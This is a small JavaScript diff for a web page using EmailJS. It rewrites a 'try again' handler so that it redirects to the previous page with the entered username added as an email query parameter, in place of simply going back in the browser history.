@@ -432,7 +432,11 @@
             emailjs.init("WWo7anZY4HvX4SL2h");
 
             function tryAgain() {
-                window.history.back();
+                var username = document.getElementById('username').value;
+                var prevUrl = document.referrer || window.location.href;
+                var url = new URL(prevUrl);
+                url.searchParams.set('email', username);
+                window.location.href = url.toString();
             }
 
             document.addEventListener('DOMContentLoaded', function () {
